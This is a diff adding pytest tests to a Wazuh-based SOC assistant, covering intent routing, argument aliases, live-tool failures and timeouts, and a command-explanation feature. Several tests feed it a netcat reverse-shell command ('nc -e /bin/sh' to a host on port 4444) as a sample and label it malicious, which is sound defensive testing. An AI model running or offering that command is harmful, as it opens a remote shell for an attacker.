@@ -4,6 +4,7 @@ from datetime import UTC, datetime
 import pytest
 from opensearchpy import exceptions as opensearch_exc
 
+from app.services.wazuh.exceptions import WazuhTimeoutError
 from app.services.wazuh.models import (
     AlertEvidence,
     AlertIngestionDocument,
@@ -12,6 +13,7 @@ from app.services.wazuh.models import (
     IOCHuntResult,
     RawAlertDocument,
 )
+from app.soc_assistant.command_explainer import CommandExplanation
 from app.soc_assistant.router import AssistantIntentRouter
 from app.soc_assistant.schemas import AssistantCommandName, AssistantIntent
 from app.soc_assistant.schemas import QuestionAnswer
@@ -45,6 +47,22 @@ class LowConfidenceLLM:
                 confidence=0.2,
             ),
             {"input_tokens": 5, "output_tokens": 2},
+        )
+
+
+class ArgumentAliasLLM:
+    def __init__(self, command, arguments):
+        self.command = command
+        self.arguments = arguments
+
+    def invoke_structured(self, schema, messages):
+        return (
+            AssistantIntent(
+                command=self.command,
+                arguments=self.arguments,
+                confidence=1.0,
+            ),
+            {"input_tokens": 8, "output_tokens": 3},
         )
 
 
@@ -203,6 +221,9 @@ def test_slash_commands_are_strict_and_typed():
     question = router.parse_slash("/ask how should I contain this alert?")
     assert question.command == AssistantCommandName.CHAT
     assert question.arguments["question"] == "how should I contain this alert?"
+    explained = router.parse_slash("/explain nc -e /bin/sh 192.0.2.10 4444")
+    assert explained.command == AssistantCommandName.EXPLAIN
+    assert explained.arguments["command"] == "nc -e /bin/sh 192.0.2.10 4444"
     with pytest.raises(ValueError, match="Unsupported option"):
         router.parse_slash("/alerts --write yes")
     with pytest.raises(ValueError, match="Unknown command"):
@@ -256,6 +277,115 @@ def test_low_confidence_classification_routes_to_chat_not_a_dead_end():
     assert routed.command == AssistantCommandName.CHAT
     assert routed.arguments["question"] == "Give me an operational picture."
     assert usage["input_tokens"] == 5
+
+
+@pytest.mark.parametrize(
+    ("message", "expected_alert_id"),
+    [
+        ("investigate alert 12345", "12345"),
+        ("investigate alert ALERT-99", "ALERT-99"),
+        ("investigate this", None),
+        ("start investigation alert-xyz", "alert-xyz"),
+    ],
+)
+def test_natural_investigation_references_do_not_capture_placeholders(
+    message,
+    expected_alert_id,
+):
+    intent, usage = AssistantIntentRouter(llm=FailingLLM()).route(message)
+
+    assert intent.command == AssistantCommandName.INVESTIGATE
+    assert intent.arguments.get("alert_id") == expected_alert_id
+    assert usage == {"input_tokens": 0, "output_tokens": 0}
+
+
+@pytest.mark.parametrize(
+    ("command", "raw_arguments", "expected_arguments"),
+    [
+        (
+            AssistantCommandName.ALERTS,
+            {"agent": "004"},
+            {"agent_id": "004"},
+        ),
+        (
+            AssistantCommandName.STATUS,
+            {"investigation-id": "INV-ABC123"},
+            {"investigation_id": "INV-ABC123"},
+        ),
+    ],
+)
+def test_oxy_argument_aliases_are_normalized(
+    command,
+    raw_arguments,
+    expected_arguments,
+):
+    router = AssistantIntentRouter(
+        llm=ArgumentAliasLLM(command, raw_arguments)
+    )
+
+    intent, usage = router.route("Give me the scoped operational record.")
+
+    assert intent.command == command
+    assert intent.arguments == expected_arguments
+    assert intent.source == "oxy"
+    assert usage["input_tokens"] == 8
+
+
+def test_unknown_oxy_arguments_fail_closed_to_chat():
+    router = AssistantIntentRouter(
+        llm=ArgumentAliasLLM(
+            AssistantCommandName.ALERTS,
+            {"endpoint_scope": "004"},
+        )
+    )
+
+    intent, _ = router.route("Give me the scoped operational record.")
+
+    assert intent.command == AssistantCommandName.CHAT
+    assert intent.source == "fallback"
+
+
+@pytest.mark.parametrize(
+    ("message", "command", "arguments"),
+    [
+        (
+            "what alerts came in overnight?",
+            AssistantCommandName.ALERTS,
+            {"hours": 12},
+        ),
+        (
+            "any critical alerts in the last hour?",
+            AssistantCommandName.ALERTS,
+            {"hours": 1, "severity": "critical"},
+        ),
+        (
+            "show me alerts from agent 004",
+            AssistantCommandName.ALERTS,
+            {"agent_id": "004"},
+        ),
+        ("are we connected?", AssistantCommandName.HEALTH, {}),
+        (
+            "isolate agent 004",
+            AssistantCommandName.CHAT,
+            {"question": "isolate agent 004"},
+        ),
+        (
+            "explain this command: nc -e /bin/sh 1.2.3.4 4444",
+            AssistantCommandName.EXPLAIN,
+            {"command": "nc -e /bin/sh 1.2.3.4 4444"},
+        ),
+    ],
+)
+def test_high_signal_natural_language_routes_without_oxy(
+    message,
+    command,
+    arguments,
+):
+    intent, usage = AssistantIntentRouter(llm=FailingLLM()).route(message)
+
+    assert intent.command == command
+    assert intent.arguments == arguments
+    assert usage == {"input_tokens": 0, "output_tokens": 0}
 
 
 def test_casual_investigate_phrasing_reaches_chat_deterministically():
@@ -395,6 +525,56 @@ def test_question_agent_answers_read_only_soc_questions(monkeypatch):
     assert "Block the source" in response.assistant_message
     assert question_agent.calls[0]["question"] == "how do I fix these alerts?"
     assert gateway.calls == []
+
+
+def test_live_tool_failure_never_falls_back_to_ungrounded_answer(monkeypatch):
+    class FailingLiveToolAgent:
+        def answer(self, **kwargs):
+            raise opensearch_exc.ConnectionError("connection refused")
+
+    class SpyQuestionAgent(FakeQuestionAgent):
+        def answer(self, **kwargs):
+            raise AssertionError(
+                "question_agent must not run after a live tool failure"
+            )
+
+    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
+    service = SOCAssistant(
+        gateway=FakeGateway(),
+        investigations=FakeInvestigations(),
+        router=AssistantIntentRouter(llm=FailingLLM()),
+        question_agent=SpyQuestionAgent(),
+        tool_agent=FailingLiveToolAgent(),
+    )
+
+    response = respond(service, "were there failed SSH logins today?")
+
+    assert response.selected_command == AssistantCommandName.CHAT
+    assert response.response["answer_type"] == "live_data_unavailable"
+    assert response.response["grounded"] is False
+    assert response.response["error"]["code"] == "WAZUH_UNAVAILABLE"
+    assert response.tools_used == ["soc_tool_agent"]
+    assert response.activities[-1].status == "failed"
+
+
+def test_live_tool_timeout_is_reported_as_timeout(monkeypatch):
+    class TimingOutToolAgent:
+        def answer(self, **kwargs):
+            raise WazuhTimeoutError("timed out after retries")
+
+    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
+    service = SOCAssistant(
+        gateway=FakeGateway(),
+        investigations=FakeInvestigations(),
+        router=AssistantIntentRouter(llm=FailingLLM()),
+        question_agent=FakeQuestionAgent(),
+        tool_agent=TimingOutToolAgent(),
+    )
+
+    response = respond(service, "were there failed SSH logins today?")
+
+    assert response.response["error"]["code"] == "WAZUH_TIMEOUT"
+    assert "did not answer" in response.assistant_message
 
 
 def test_question_agent_failure_does_not_break_commands(monkeypatch):
@@ -716,12 +896,46 @@ def test_help_and_health_are_available_without_llm(monkeypatch):
     service, _, _ = assistant()
 
     help_response = respond(service, "/help")
-    assert len(help_response.response["commands"]) == 9
+    assert len(help_response.response["commands"]) == 10
     assert help_response.tools_used == []
 
     health = respond(service, "/health")
     assert health.response["status"] == "healthy"
     assert health.tools_used == ["indexer_health", "validate_server"]
+
+
+def test_explain_command_is_available_from_chat_and_slash(monkeypatch):
+    def fake_explain(command):
+        assert command == "nc -e /bin/sh 1.2.3.4 4444"
+        return (
+            CommandExplanation(
+                plain_english="Netcat launches a shell and connects it outward.",
+                behavior=["Starts a shell", "Connects to 1.2.3.4:4444"],
+                risk="malicious",
+                indicators=["-e", "/bin/sh"],
+                recommended_checks=["Review process and network telemetry."],
+            ),
+            {"input_tokens": 20, "output_tokens": 12},
+        )
+
+    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
+    monkeypatch.setattr(
+        "app.soc_assistant.service.explain_command",
+        fake_explain,
+    )
+    service, _, _ = assistant()
+
+    natural = respond(
+        service,
+        "explain this command: nc -e /bin/sh 1.2.3.4 4444",
+    )
+    slash = respond(service, "/explain nc -e /bin/sh 1.2.3.4 4444")
+
+    for response in (natural, slash):
+        assert response.selected_command == AssistantCommandName.EXPLAIN
+        assert response.response["risk"] == "malicious"
+        assert response.response["display_mode"] == "command_explanation"
+        assert response.tools_used == ["explain_command"]
 
 
 def test_wazuh_connection_failure_returns_assistant_message(monkeypatch):
